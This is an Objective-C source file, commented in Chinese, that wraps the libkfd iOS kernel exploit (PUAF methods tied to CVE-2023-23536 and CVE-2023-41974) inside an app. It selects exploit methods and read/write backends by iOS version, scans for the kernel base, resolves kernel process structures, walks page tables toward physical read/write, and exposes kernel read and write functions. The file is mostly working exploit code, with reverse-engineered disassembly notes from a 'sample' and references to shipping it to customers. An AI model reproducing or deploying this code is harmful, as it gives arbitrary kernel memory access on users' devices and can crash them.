//
//  KernelMemory.m
//  内核内存读写层实现。
//
//  ⚠️ 整个工程只有本文件可以 #include "libkfd.h"：
//     libkfd 是 header-only，且 kopen / kread / kwrite / kclose 都是非 static 定义，
//     第二个 include 点会撞重复符号。别的文件一律走 KernelMemory.h 的 C 接口。
//
//  数据流（对齐样本 _kfd_port/施工总纲.md）：
//      kopen
//        └─ info_init    读 kern.version → 选版本表项
//        └─ puaf_run     PUAFF 制造悬空 PTE（不碰目标进程）
//        └─ krkw_run     用半随机游走拿到 psemnode，建立 kread / kwrite
//        └─ info_run     kread 反查 current_proc / kernel_proc
//        └─ <perf_run 已按本路线关闭：不读 kernelcache__* 静态表>
//      之后：从 kernel_proc 向下页对齐扫 MH_MAGIC_64 → kernel base
//
//  全程不调用 task_for_pid，不使用 mach_vm_read。
//

#import <Foundation/Foundation.h>
#include <sys/sysctl.h>
/* 自检里用 _mh_execute_header 拿本进程 Mach-O 头，它定义在 <mach-o/ldsyms.h>。 */
#include <mach-o/ldsyms.h>

#include "KernelMemory.h"
#include "libkfd.h"

#pragma mark - 状态

/// kopen 返回的句柄。0 表示未就绪。
static uint64_t g_handle = 0;

/*
 * 对外就绪标志，与 g_handle 分开。
 *
 * g_handle 一赋上，内部那几个步骤（扫 kernel base、定位线性映射）就都跑得动
 * 了，所以它必须尽早发布；但"内部能跑"不等于"对外可用"。
 * km_ready() 若直接返回 g_handle != 0，则 km_init 还在同一个线程里跑
 * km_scan_kernel_base（最多几千次 kread）的时候，别的线程就能从
 * km_ready() 拿到 true 并开始并发 kread。
 *
 * 而 libkfd 的后端不是线程安全的：kread_sem_open 每次读都要改写自己
 * psemnode 的 pinfo，kwrite_sem_open 与 kread 共用同一块 krkw_method_data。
 * 并发进去会让内核写入落到非预期地址 —— 那正是 vm_map 被写坏的形态。
 *
 * 所以拆成两个：g_handle 负责"内部可用"，g_kernel_ready 负责"对外可用"，
 * 后者只在 km_init 全程走完之后才置位。
 */
static bool g_kernel_ready = false;
/// 扫描得到的 kernel base（kernelcache 的 MH_MAGIC_64 所在地址）。
static uint64_t g_kernel_base = 0;

#pragma mark - 失败回退（对齐 kfd-mcp-ipad 的 kfd_glue_abort）

/*
 * 上游 kfd 的 assert 失败会 sleep(30) 再 exit(1)。对 Aether 这种长驻 app，
 * 那意味着「一次 PUAFF 没落地 = 进程猝死」，而且它 sleep 的那 30 秒正好
 * 把残留状态留在原地，下一次启动接着撞。
 *
 * 这里注册一个 longjmp 处理器，把失败降级成 kopen 返回 0：
 * 应用可以干净地报错、不写内核、也不留下半截状态。
 */
kfd_assert_handler_t kfd_assert_handler = NULL;
struct kfd_assert_site kfd_assert_last = { NULL, 0, NULL };

/// kopen 的 setjmp 落点。只有 kfd_try_open 在跑时非 NULL。
static jmp_buf g_kopen_jmp;
static bool g_kopen_jmp_armed = false;

/*
 * 断言失败的详情，直接给面板用。
 *
 * 为什么不只用 NSLog：设备日志要 Console.app 或 idevicesyslog 才看得到，
 * 而断言失败的行号正是排查的唯一线索。把它塞进 km_init 的 err（面板首行）
 * 才能让人一眼看到是 libkfd 的哪一步失守。
 * 静态缓冲区：*why 的生命周期只需覆盖调用方读取那一次。
 */
static char g_kopen_abort_detail[256];

/// 断言失败时由 common.h 的 assert 宏调用：不退出，跳回调用方。
static void km_assert_fallback(void)
{
    if (g_kopen_jmp_armed) {
        longjmp(g_kopen_jmp, 1);
    }
    /* 没武装（不在 kopen 调用窗口内）就交回 assert 的原路径。 */
}

/**
 * 包一层 kopen：把「库内断言失败」从「进程猝死」降级成「返回 0」。
 *
 * 注意这里**不重试**。失败的 kopen 会在内核侧留下 PUAFF 残留（悬空 PTE、
 * 半裁开的 vm_map 条目），而 sem_unlink 只清得掉用户态那个 semaphore 名字，
 * 清不掉内核侧残留。在残留之上再跑一次 PUAFF，等于对已经不一致的 vm_map
 * 再插一次 —— 失败概率是累积的，不是独立的。
 * 想再试，交给下一次进程启动：那时 vm_map 是干净的。
 */
static uint64_t kfd_try_open(u64 puaf_pages, u64 puaf_method, u64 read_method, u64 write_method,
                             const char **why)
{
    kfd_assert_handler = km_assert_fallback;

    g_kopen_jmp_armed = true;
    if (setjmp(g_kopen_jmp) == 0) {
        uint64_t fd = kopen(puaf_pages, puaf_method, read_method, write_method);
        g_kopen_jmp_armed = false;
        if (fd != 0) {
            return fd;
        }
        if (why) {
            *why = "kopen returned 0 (PUAFF did not land)";
        }
    } else {
        /* longjmp 回来：断言失败现场已记在 kfd_assert_last。 */
        g_kopen_jmp_armed = false;
        NSLog(@"[KernelMemory] kopen aborted at %s:%d (%s)",
              kfd_assert_last.file ? kfd_assert_last.file : "?",
              kfd_assert_last.line,
              kfd_assert_last.cond ? kfd_assert_last.cond : "?");
        if (why) {
            /*
             * 把行号一起交给调用方 —— 面板首行会显示它。
             * 只给"assert failed"等于什么都没说：libkfd 里有几十条 assert，
             * 不指明哪一条就没法往下查。
             */
            snprintf(g_kopen_abort_detail, sizeof(g_kopen_abort_detail),
                     "kopen 断言失败 %s:%d (%s)",
                     kfd_assert_last.file ? kfd_assert_last.file : "?",
                     kfd_assert_last.line,
                     kfd_assert_last.cond ? kfd_assert_last.cond : "?");
            *why = g_kopen_abort_detail;
        }
    }

    /*
     * 只清用户态的 posix semaphore 对象，然后**直接放弃**，不重试。
     *
     * 这里刻意做成"一次失败即终止本次会话"：
     *  - sem_unlink 只能清掉用户态那个 semaphore 名字，清不掉 kopen 内部
     *    已经动过的内核侧 PUAFF 残留（悬空 PTE、半裁开的 vm_map 条目）。
     *  - 在残留之上再跑一次 PUAFF，等于对同一个已经不一致的 vm_map 再插一次
     *    —— panic 概率不是三次独立失败，而是随次数累积上升。
     *  - 上游 README 的立场也是"失败就停"，清理责任在 PUAFF 自己的 cleanup，
     *    而不是靠重试掩盖。
     *
     * 想重试就交给下一次进程启动：那时 vm_map 是干净的。
     */
    sem_unlink("kfd-posix-semaphore");

    return 0;
}

/// 当前进程 pmap 的内核地址（info_run 反查得到）。
static uint64_t g_current_pmap = 0;
/// 「内核 VA − PA」差值。经自校验后才有意义。
static uint64_t g_linear_delta = 0;
static bool g_linear_map_valid = false;

/// struct pmap 的 tte 字段偏移。static_info.h 里 pmap 以 tte/ttep 开头。
#define KM_PMAP_TTE_OFFSET 0x00

/// PUAFF 页数。
///
/// 回到 2048（kfd README 的示例值 / 上游 ContentView 的默认档）。
///
/// 之前改成 512 是基于对样本的离线模拟推断（样本按
/// hw.cpufamily + hw.memsize + os_proc_available_memory 在
/// {128,160,256,512,3072} 里挑）。那个推断有两个问题：
///   1. 模拟当时读到 kwrite_method = 0（合法域是 0/1/2），说明模拟状态不完整、
///      走的分支未必是真实路径；
///   2. 样本的 kfd 是自建 physrw 路径（mach_memory_object_memory_entry_64 +
///      vm_remap 自建窗口 + physrw_pte），与上游 libkfd 的 PUAF→KRKW 路线不同，
///      它的页数选择不能直接搬到这条路上。
///
/// 改回 2048 的直接依据是这次设备上的失败点：
///   kopen 报 assert failed，最可能落在 krkw.h:222 的 assert_false(krkw_type)
///   —— 那一行是「在 PUAF 页里没搜到目标内核对象（psemnode / fileproc）」。
///   而 krkw.h:142 的 grabbed_puaf_pages_goal = number_of_puaf_pages / 4，
///   512 页会先被「抓走」128 页（上游自称这是浪费 25% 的粗暴启发式），
///   只剩 384 页可搜。上游文档对此有明确结论：
///     "a higher number of PUAF pages makes it easier for the rest of the
///      exploit to achieve a kernel read/write primitive"
///   2048 时抓走 512、剩 1536 页，是 512 情形下可搜页数的 4 倍。
///
/// 关于彩屏：页数与本轮之前那三次 panic **没有因果关系**。panic 链是
/// perf_run 失败 → longjmp 跳过 puaf_cleanup → 残留 vm_map 被后续操作踩中，
/// 而那条链已经由 perf_supported = false 切断。页数只影响 KRKW 阶段的搜索
/// 成功率。kopen 自身断言范围为 16 ... 3072（实测），2048 位于其中。
static const u64 kfd_puaf_pages = 2048;

/// kernel base 反向扫描上限，防止踩到未映射区域形成死循环。
static const uint64_t kfd_kbase_scan_max = 0x4000000; /* 64 MB */

#pragma mark - 工具

bool km_is_kernel_address(uint64_t addr)
{
    return (addr >> 48) == 0xFFFF;
}

/// 读取 kern.version 全文。取不到返回 nil。
static NSString *km_read_kern_version(void)
{
    char buffer[512] = {};
    size_t size = sizeof(buffer);
    if (sysctlbyname("kern.version", buffer, &size, NULL, 0) != 0) {
        return nil;
    }
    return [NSString stringWithUTF8String:buffer];
}

/// 版本是否落在 dynamic_info.h 的 kern_versions[] 覆盖范围内。
///
/// kfd 的 info_init() 在匹配不到时走 assert_false()，在 app 里等于 exit(1)。
/// 所以这里先自己挡一次，把「不支持」变成一条可读错误而不是一次闪退。
/// 判定口径与 info_init 一致：比 Darwin 主次号前缀。
static BOOL km_version_is_listed(NSString *kernVersion)
{
    if (kernVersion.length == 0) {
        return NO;
    }

    const size_t prefixLength = 29; /* strlen("Darwin Kernel Version 22.5.0") */
    if (kernVersion.length < prefixLength) {
        return NO;
    }
    NSString *prefix = [kernVersion substringToIndex:prefixLength];

    const u64 count = sizeof(kern_versions) / sizeof(kern_versions[0]);
    for (u64 i = 0; i < count; i++) {
        const char *entry = kern_versions[i].kern_version;
        if (strncmp(prefix.UTF8String, entry, prefixLength) == 0) {
            return YES;
        }
    }
    return NO;
}

/**
 * 版本是否在 kfd 的**下界**之上。
 *
 * 与 km_version_is_listed 互补：
 *   km_version_is_listed    管"表里有没有"——负责上界（高于 16.6.1 无条目）
 *   km_version_is_supported 管"低于下限"——负责下界（iOS 13/14 没有可用 PUAFF）
 *
 * 两者缺一不可。本工程部署目标是 iOS 13.0（project.yml / Music.xcconfig /
 * Info.plist 的 MinimumOSVersion），所以 iOS 13/14 的设备**装得上**；但 kfd 的
 * 三个 PUAFF 都要 iOS 15 起才存在，且 dynamic_info.h 最早只到 Darwin 21。
 * 不挡这一道，那些设备会在 info_init 里撞 assert（app 直接闪退），而不是
 * 收到一句明确的话。
 */
static BOOL km_version_is_supported(const char **why)
{
    NSString *kernVersion = km_read_kern_version();
    if (kernVersion.length == 0) {
        /* 读不到 kern.version 说明环境异常，不冒险往下走。 */
        if (why) {
            *why = "无法读取 kern.version";
        }
        return NO;
    }

    NSString *marker = @"Darwin Kernel Version ";
    NSRange r = [kernVersion rangeOfString:marker];
    if (r.location == NSNotFound) {
        if (why) {
            *why = "kern.version 格式无法识别";
        }
        return NO;
    }

    /* 取 "22.4.0"，遇到非数字/非点的字符（通常是 ':'）即停。 */
    NSString *rest = [kernVersion substringFromIndex:NSMaxRange(r)];
    NSMutableString *num = [NSMutableString string];
    for (NSUInteger i = 0; i < rest.length; i++) {
        unichar ch = [rest characterAtIndex:i];
        if ((ch >= '0' && ch <= '9') || ch == '.') {
            [num appendFormat:@"%C", ch];
        } else {
            break;
        }
    }
    if (num.length == 0) {
        if (why) {
            *why = "kern.version 里解析不出 Darwin 版本号";
        }
        return NO;
    }

    NSInteger major = [[num componentsSeparatedByString:@"."] firstObject].integerValue;

    /*
     * 下界：Darwin 21（iOS 15.x）起才有可用 PUAFF。
     *
     * 但这里刻意把门槛抬到 Darwin 22（iOS 16.0）：iOS 15 虽然 PUAFF 存在，
     * 本工程却走不通它 —— iOS < 16 会被分派到 kread_IOSurface 后端
     * （见下方 readMethod 的 @available），而 dynamic_info.h 里 Darwin 21
     * 那条的 ios__* 五个偏移全是 0（IndexedTimestampPtr / AllocSize /
     * PixelFormat / UseCountPtr / ReadDisplacement），该后端完全依赖它们。
     * 换句话说 iOS 15 会在拿全 0 偏移去操作 IOSurface 对象时失败或写坏内核。
     *
     * 与其让客户在 iOS 15 上撞莫名其妙的失败，不如在这里明确拒绝：
     * 补齐 iOS 15 偏移需要有真机实测数据，目前没有。
     */
    if (major < 21) {
        if (why) {
            *why = "系统版本过低：kfd 的 PUAFF 从 iOS 15.0 起才存在（需要 iOS 16.0 及以上）";
        }
        return NO;
    }
    if (major == 21) {
        if (why) {
            *why = "iOS 15.x 暂不支持：本工程在 iOS 16 以下会走 IOSurface 后端，"
                   "而该后端的偏移尚未取到实测数据（需要 iOS 16.0 及以上）";
        }
        return NO;
    }

    return YES;
}

/*
 * 地址翻译层的前向声明。
 *
 * 两者定义在文件后部的「地址翻译层」一节，但 km_self_test 要先调用它们。
 * 不能依赖隐式声明 —— C 里那是错误，Clang 默认只是警告、很多配置下照样编过，
 * 但 `bool` 返回的函数会被当成返回 int，一旦被误判就悄悄出错。
 */
static bool km_page_table_walk(uint64_t pmap, uint64_t va, uint64_t *pa_out);
static bool km_pte_for(uint64_t pmap, uint64_t va, uint64_t *pte_pa_out);

/// 从 kernel_proc 向下找到 kernelcache 的 Mach-O 头。
///
/// 样本做法：拿一个内核 VA、页对齐、每步退 16 KB、读 4 字节比 0xFEEDFACF。
/// 样本用的是编译期写死的锚点常量；这里改用它已经掌握的真实内核地址
/// （info_run 反查出来的 kernel_proc），省掉那张必须逐版本重取的常量表。
static uint64_t km_scan_kernel_base(uint64_t anchor)
{
    if (anchor == 0) {
        return 0;
    }

    const uint64_t page = 0x4000; /* arm64 16 KB 内核页 */
    uint64_t cursor = anchor & ~(page - 1);

    for (uint64_t walked = 0; walked < kfd_kbase_scan_max; walked += page) {
        if (cursor < page || !km_is_kernel_address(cursor)) {
            break;
        }

        /*
         * 用公共 kread()：它按 krkw_init 选定的后端分发，
         * 所以这里不能写死某个后端（早先写的是 kread_sem_open_kread_u32）。
         */
        uint32_t magic = 0;
        kread((u64)g_handle, cursor, &magic, sizeof(magic));
        if (magic == 0xFEEDFACF) {
            return cursor;
        }

        cursor -= page;
    }

    return 0;
}

#pragma mark - 对外接口

bool km_init(const char **err)
{
    if (err) {
        *err = NULL;
    }
    if (g_handle != 0) {
        return true;
    }

    NSString *kernVersion = km_read_kern_version();
    NSLog(@"[KernelMemory] kern.version = %@", kernVersion ?: @"(unreadable)");

    if (!km_version_is_listed(kernVersion)) {
        // 把 Darwin 主次号单独提出来放前面 —— 面板一行装不下整个 kern.version，
        // 尾部会被截断，而「哪个版本没覆盖」正是这一步唯一有用的信息。
        NSString *shortVer = @"(unreadable)";
        if (kernVersion != nil) {
            NSRange m = [kernVersion rangeOfString:@"Darwin Kernel Version "];
            if (m.location != NSNotFound) {
                NSString *rest = [kernVersion substringFromIndex:NSMaxRange(m)];
                NSMutableString *num = [NSMutableString string];
                for (NSUInteger i = 0; i < rest.length; i++) {
                    unichar ch = [rest characterAtIndex:i];
                    if ((ch >= '0' && ch <= '9') || ch == '.') {
                        [num appendFormat:@"%C", ch];
                    } else {
                        break;
                    }
                }
                if (num.length > 0) {
                    shortVer = [num copy];
                }
            } else {
                shortVer = [kernVersion substringToIndex:MIN((NSUInteger)29, kernVersion.length)];
            }
        }
        NSLog(@"[KernelMemory] version not listed: %@", shortVer);
        if (err) {
            static char errBuf[192];
            snprintf(errBuf, sizeof(errBuf),
                     "Darwin %s 不在 kern_versions[] 里（见 libkfd/info/dynamic_info.h）",
                     shortVer.UTF8String);
            *err = errBuf;
        }
        return false;
    }

    /*
     * PUAFF 按版本选。三个方法的适用范围来自 kfd 自己的 README：
     *   physpuppet = CVE-2023-23536  →  iOS 16.4 修复
     *   smith      = CVE-2023-32434  →  iOS 16.5.1 修复
     *   landa      = CVE-2023-41974  →  iOS 17.0 修复
     *
     * 但「没被修」不等于「能用」。README 里另有一句直接关系到设备安全：
     *
     *   "It sleeps for 30 seconds because the kernel might panic on exit for
     *    certain PUAF methods that require some cleanup post-KRKW
     *    (e.g. puaf_smith)."
     *
     * smith 破坏 VM 的 hole list，清理不成立时**内核 panic**（整个设备彩屏重启，
     * 不是 app 崩）。实测在 16.4.1 上用 smith 就是这个结果。
     *
     * 所以分区改成：
     *   15.x – 16.3    →  physpuppet（最简单、无清理风险）
     *   16.4 – 16.5    →  landa（smith 的窗口，但 smith 会 panic；landa 到 17.0
     *                            才修，在这个区间同样可用且不破坏 hole list）
     *   16.5.1 及以上  →  landa
     *
     * 也就是：**smith 一律不用**。它的收益（覆盖一个我们也能用 landa 的窄区间）
     * 完全抵不过每次失败换一次内核 panic 的代价。
     */
    u64 puafMethod;
    if (@available(iOS 16.4, *)) {
        puafMethod = puaf_landa;
    } else {
        puafMethod = puaf_physpuppet;
    }

    NSLog(@"[KernelMemory] puaf method = %s",
          (puafMethod == puaf_landa) ? "landa" : "physpuppet");

    /*
     * kread 后端按 iOS 版本分派 —— 与样本一致。
     *
     * 样本实测（见 _kfd_port/样本通道权威实测结论.md §kread 分派）：
     *   kopen 之前先做一次 @available(iOS 16.0, *) 检查，用它的结果
     *   二选一写进 kfd->kread_method：
     *       0x100F8FBD8  mov  w0, #2 / w1, #0x10 / w2, #0 / w3, #0
     *       0x100F8FBE8  bl   0x1010AFE1C     ; @available 包装
     *       0x100F8FBFC  cinc x8, x8, eq      ; -> 1 或 2
     *       0x100F8FC00  str  x8, [x19, #8]   ; kread_method
     *   枚举: kread_kqueue_workloop_ctl=0, kread_sem_open=1, kread_IOSurface=2
     *
     * 为什么 iOS 16 不能用 IOSurface：读原语被改了 —— userclient 方法不再
     * 返回目标处单个 32 位整数，而是返回相邻两个 32 位整数之和（Vertex 的
     * README 记载：arm64e 上还有更多 data PAC）。样本的 IOSurface 读路径里
     * 没有任何针对这个变化的补偿，且它的 ReadDisplacement 取的是 iOS 15 的
     * 值 0x14，所以那条路只在 iOS 15 成立。
     *
     * 证据：编译器只对 0x100F7B828（sem_open 的 kread）生成了去虚拟化守卫
     * （0x100F8BB48 cmp x9, x10），IOSurface 的 kread 实现一次都没有 ——
     * 说明编译期已知的那个 kread 实现是 sem_open。
     */
    u64 readMethod;
    if (@available(iOS 16.0, *)) {
        readMethod = kread_sem_open;
    } else {
        readMethod = kread_IOSurface;
    }

    /*
     * kwrite 侧必须与 kread 侧成对 —— 这不是风格问题，是正确性问题。
     *
     * kwrite_sem_open 是"搭车"实现：它把 kfd->kwrite.krkw_method_data 直接
     * 指向 kread 的缓冲（kwrite_sem_open_init 里那一行赋值），并按 i32 解释
     * 每个元素（文件描述符）。而 kread_IOSurface 的同一块缓冲里放的是 u64
     * 的 surface_id。混用时 deallocate 会把 surface_id 当 fd 去 close()、
     * free 也会用错误的 size 释放。
     *
     * opa334 的 kwrite_IOSurface.h 开头原话：
     *   "I attempted to make this standalone from kread but that probably
     *    doesn't work, so just select IOSurface for both kread and kwrite"
     *
     * 枚举顺序在两套里刻意对齐（dup 与 kqueue_workloop_ctl 都不参与），
     * 所以 IOSurface 侧 read/write 同为 2，sem_open 侧同为 1。
     */
    const u64 writeMethod = (readMethod == kread_IOSurface) ? kwrite_IOSurface
                                                            : kwrite_sem_open;

    /*
     * ── 版本门：不在 kfd 支持区间内就干净拒绝，不调 kopen ──
     *
     * 为什么必须有这道门：本工程的部署目标是 iOS 13.0（project.yml /
     * Music.xcconfig / Info.plist 的 MinimumOSVersion），也就是 iOS 13/14 的
     * 设备**能装上**。但 kfd 的三个 PUAFF 对应的是 iOS 15.0 起才存在的漏洞：
     *
     *   physpuppet = CVE-2023-23536   iOS 15.0 起
     *   smith      = CVE-2023-32434   iOS 16.4 起
     *   landa      = CVE-2023-41974   iOS 16.4 起
     *
     * 在 15.0 以下根本没有可用的 PUAFF，而且 dynamic_info.h 最早只覆盖到
     * Darwin 21；真的跑下去只会在 info_init 里撞 assert 或用到垃圾偏移。
     * 宁可在这里给一句明确的话，也不要让客户看到"打开就重启"。
     *
     * 15.0–16.6.1 是完整支持区间（对应 dynamic_info.h 的 Darwin 21 / 22）。
     */
    const char *verWhy = NULL;
    if (!km_version_is_supported(&verWhy)) {
        NSString *ver = [[NSProcessInfo processInfo] operatingSystemVersionString];
        if (err) {
            *err = verWhy ? verWhy : "iOS 版本不在 kfd 支持区间（16.0 – 16.6.1）";
        }
        NSLog(@"[KernelMemory] unsupported OS, refusing to run exploit: %@ (%@)",
              ver, verWhy ? [NSString stringWithUTF8String:verWhy] : @"?");
        return false;
    }

    /*
     * 到这一步就没有回头路了：kopen 里 PUAFF 一旦失败，可能让**内核** panic
     * （整个设备彩屏重启，不是 app 崩）。NSLog 进 unified log、会落盘，
     * 所以彩屏之后这一行是唯一还能查到的参数记录。
     */
    NSLog(@"[KernelMemory] kopen(pages=%llu, puaf=%s, kread=%s, kwrite=%s)",
          (unsigned long long)kfd_puaf_pages,
          (puafMethod == puaf_landa) ? "landa" : "physpuppet",
          (readMethod == kread_IOSurface) ? "IOSurface" : "sem_open",
          (writeMethod == kwrite_IOSurface) ? "IOSurface" : "sem_open");

    /*
     * 走 km 的失败回退：内核侧断言失败时 kopen 返回 0，而不是 sleep(30)+exit(1)。
     * 注意这只挡「库级失败」——如果 PUAFF 已经把 vm_map 写坏、内核自己 panic，
     * 用户态任何手段都拦不住，那需要靠不触发它来避免。
     */
    const char *openWhy = NULL;
    uint64_t handle = kfd_try_open(kfd_puaf_pages, puafMethod, readMethod, writeMethod, &openWhy);
    if (handle == 0) {
        if (err) {
            *err = openWhy ? openWhy : "kopen returned 0 (PUAFF did not land)";
        }
        return false;
    }

    struct kfd *kfd = (struct kfd *)handle;
    g_handle = handle;

    NSLog(@"[KernelMemory] current_proc = %#llx  kernel_proc = %#llx",
          (unsigned long long)kfd->info.kaddr.current_proc,
          (unsigned long long)kfd->info.kaddr.kernel_proc);

    /*
     * 顺序对齐样本 physrw：先扫 kernel base，再做线性映射定位。
     * 线性映射的基准要用到 kernel base 附近的确定地址，所以不能倒过来。
     */
    g_kernel_base = km_scan_kernel_base(kfd->info.kaddr.kernel_proc);
    NSLog(@"[KernelMemory] kernel base = %#llx (scanned)", (unsigned long long)g_kernel_base);

    if (g_kernel_base == 0) {
        /*
         * 读写原语已经可用，只是没扫到 kernelcache 头。这不影响 kread/kwrite
         * 本身，所以不当作初始化失败 —— kernel base 的消费者可以自行降级。
         */
        NSLog(@"[KernelMemory] kernel base scan missed; kread/kwrite still usable");
    }

    /*
     * 地址翻译层：走页表拿 PA，再用线性映射补回 KVA。
     * 这一步同时验证 kread 在原语层面真的可用。
     */
    km_locate_linear_map();
    NSLog(@"[KernelMemory] linear map %@, pmap = %#llx",
          g_linear_map_valid ? @"ready" : @"unresolved",
          (unsigned long long)g_current_pmap);

    /* procForPid 自证：自己进程必须能查到，且 p_pid 对得上。 */
    uint64_t selfProc = km_proc_for_pid(kfd->info.env.pid);
    NSLog(@"[KernelMemory] procForPid(self=%d) = %#llx %@",
          kfd->info.env.pid, (unsigned long long)selfProc,
          (selfProc == kfd->info.kaddr.current_proc) ? @"OK" : @"MISMATCH");

    /*
     * 到这里才算对外就绪。放在最后一行，是为了让 km_ready() 在
     * km_scan_kernel_base / km_locate_linear_map 跑完之前一直返回 false ——
     * 否则别的线程会在这些内部 kread 还在进行时并发进来，而 libkfd 后端
     * 不是线程安全的（kread 改自己的 psemnode，kwrite 与 kread 共用缓冲）。
     */
    g_kernel_ready = true;

    return true;
}

void km_deinit(void)
{
    /* 先撤就绪标志，再关句柄：顺序反了会让别的线程在 kclose 之后仍被放进来。 */
    g_kernel_ready = false;

    if (g_handle == 0) {
        return;
    }
    kclose(g_handle);
    g_handle = 0;
    g_kernel_base = 0;
}

bool km_ready(void)
{
    return g_kernel_ready && (g_handle != 0);
}

uint64_t km_kernel_base(void)
{
    return g_kernel_base;
}

bool km_read(uint64_t addr, void *out, uint64_t len)
{
    if (g_handle == 0 || out == NULL || len == 0) {
        return false;
    }
    if (!km_is_kernel_address(addr)) {
        return false;
    }

    /*
     * 走公共 kread()（按选定后端分发，不能再写死 kread_sem_open_kread_u64）。
     * kread 内部的 kread_from_method 只搬 size/8 个整字，尾部不足 8 字节会丢，
     * 所以这里对尾部单独取一整个字再截断，避免把目标地址后面的字节写进调用方缓冲。
     */
    uint8_t *cursor = (uint8_t *)out;
    uint64_t remaining = len;

    while (remaining >= sizeof(uint64_t)) {
        kread((u64)g_handle, addr, cursor, sizeof(uint64_t));
        cursor += sizeof(uint64_t);
        addr += sizeof(uint64_t);
        remaining -= sizeof(uint64_t);
    }

    if (remaining > 0) {
        uint64_t tail = 0;
        kread((u64)g_handle, addr, &tail, sizeof(tail));
        memcpy(cursor, &tail, (size_t)remaining);
    }

    return true;
}

/*
 * 读一个内核 64 位字。
 *
 * `*ok` 的语义要说清：它**不是**"kread 报告成功"——`kread` 返回 void，
 * 失败时内部 assert 或静默返回，调用方拿不到任何状态。所以这里能给出的
 * 最强保证是"地址形态合法 且 两次读到同一个值"。
 *
 * 复读一致为什么够用：读失败时 kread 要么落在悬空 PTE 对应的垃圾上、
 * 要么原样不动目标缓冲（此时是上一次的残留），两种情况连续两次都取到
 * 同一值的概率极低。代价是每次读翻倍 —— 所以只给 km_read64 用，
 * 走量的 km_read 不做这件事。页表遍历每级一次，量很小，值得。
 */
uint64_t km_read64(uint64_t addr, bool *ok)
{
    if (ok) {
        *ok = false;
    }
    if (g_handle == 0 || !km_is_kernel_address(addr)) {
        return 0;
    }

    uint64_t first = 0;
    kread((u64)g_handle, addr, &first, sizeof(first));

    uint64_t second = 0;
    kread((u64)g_handle, addr, &second, sizeof(second));

    if (ok) {
        *ok = (first == second);
    }
    return first;
}

bool km_write(uint64_t addr, const void *in, uint64_t len)
{
    if (g_handle == 0 || in == NULL || len == 0) {
        return false;
    }
    if (!km_is_kernel_address(addr)) {
        return false;
    }
    /* kwrite 按 8 字节粒度写入，长度不是 8 的倍数就没有定义。 */
    if ((len % sizeof(uint64_t)) != 0) {
        return false;
    }

    /*
     * 走公共 kwrite()：同样按选定后端分发，不再写死 kwrite_dup_kwrite_u64。
     * kwrite 内部按 8 字节粒度写入，所以长度必须是 8 的倍数。
     */
    kwrite((u64)g_handle, (void *)in, addr, len);

    return true;
}

void km_self_test(char *out, size_t outSize)
{
    if (out == NULL || outSize == 0) {
        return;
    }
    out[0] = '\0';

    if (g_handle == 0) {
        snprintf(out, outSize, "kernel rw: not ready");
        return;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    size_t used = 0;

    used += (size_t)snprintf(out + used, outSize - used,
                             "current_proc=%#llx kernel_proc=%#llx kernel_base=%#llx\n",
                             (unsigned long long)kfd->info.kaddr.current_proc,
                             (unsigned long long)kfd->info.kaddr.kernel_proc,
                             (unsigned long long)g_kernel_base);

    /*
     * 锚点校验：kernel base 处必须是小端 MH_MAGIC_64，且紧跟的 cputype 为 arm64。
     * 两项同时成立才能说明 kread 读到的确实是那个 Mach-O 头，
     * 而不是一串看起来合理的垃圾。
     */
    if (outSize > used) {
        char line[192] = {};
        if (g_kernel_base == 0) {
            snprintf(line, sizeof(line), "magic: skipped (no kernel base)");
        } else {
            uint32_t header[2] = {};
            if (!km_read(g_kernel_base, header, sizeof(header))) {
                snprintf(line, sizeof(line), "magic: read failed");
            } else {
                snprintf(line, sizeof(line), "magic=%#x cputype=%#x  %s",
                         header[0], header[1],
                         (header[0] == 0xFEEDFACF) ? "OK" : "MISMATCH");
            }
        }
        used += (size_t)snprintf(out + used, outSize - used, "%s\n", line);
    }

    /* 再按偏移解引用一次 current_proc 的 pid，确认 dynamic_info 偏移可用。 */
    if (kfd->info.kaddr.current_proc && outSize > used) {
        i32 pid = (i32)dynamic_kget(proc__p_pid, kfd->info.kaddr.current_proc);
        snprintf(out + used, outSize - used,
                 "current_proc->p_pid=%d (expect %d) %s",
                 pid, kfd->info.env.pid,
                 (pid == kfd->info.env.pid) ? "OK" : "MISMATCH");
        used += strlen(out + used);
    }

    /*
     * PTE 自检 —— physrw 的第一阶段，**全程零风险**。
     *
     * 目标：确认「能定位某条 PTE 自身」并「能原值写回」。
     * 用自己进程一块已知的栈地址：
     *       ① 走 km_page_table_walk 拿它描述的物理页（VA→PA 链路）
     *       ② 走 km_pte_for 拿那条 PTE 自身的 PA（physrw 改的正是这个）
     *       ③ 把 ①的物理页经线性映射补回 KVA，用 kwrite 把 ②的 PTE 原值写回
     *       ④ 重读 ②，必须还是原值
     *
     * ③ 写回的是**读到的同一个值**，所以逻辑上不改变任何映射 —— 即便哪一步
     * 算错了也不会伤到自身，最坏是把同一个值写到别处。这一步验证的是
     * "PTE 的位置算对了"，而不是"改动能生效"（后者要配 TLB 刷新，属于第二阶段）。
     *
     * 之所以用栈变量而不是 malloc：栈页必然已映射、必然是小页（16 KB），
     * 不会撞上 L1/L2 大页那条 walk 与 pte_for 都拒绝的路径。
     */
    if (g_current_pmap != 0 && outSize > used) {
        char line[256] = {};
        volatile uint64_t stackProbe = 0x5AFE5AFE5AFE5AFEULL;
        (void)stackProbe;
        uint64_t probeVa = (uint64_t)(uintptr_t)&stackProbe;

        uint64_t page_PA = 0, pte_PA = 0;
        const bool gotPA = km_page_table_walk(g_current_pmap, probeVa, &page_PA);
        const bool gotPTE = km_pte_for(g_current_pmap, probeVa, &pte_PA);

        if (!gotPA || !gotPTE) {
            snprintf(line, sizeof(line),
                     "pte: walk=%s pte_for=%s  va=%#llx  (FAIL)",
                     gotPA ? "OK" : "FAIL", gotPTE ? "OK" : "FAIL",
                     (unsigned long long)probeVa);
        } else {
            /* PTE 的 PA 经线性映射补回 KVA，才能落到它上面读出来 */
            const uint64_t pte_kva = pte_PA + g_linear_delta;

            bool ok = false;
            const uint64_t before = km_read64(pte_kva, &ok);
            if (!ok) {
                snprintf(line, sizeof(line),
                         "pte: pte_kva=%#llx 读失败 (FAIL)",
                         (unsigned long long)pte_kva);
            } else {
                /*
                 * 只读验证 —— 定位到这条 PTE 并把它读出来，到此为止。
                 *
                 * 早先这里还有一次 km_write(pte_kva, &before)「原值写回」，
                 * 注释把它当零风险，其实不成立：PTE 里的值是物理页号 + 权限位，
                 * 一旦 g_linear_delta 或 km_pte_for 任何一处算偏，就会把 A 页的
                 * PTE 值写进 B 页的 PTE —— 凭空造出一个错配映射，而这正是
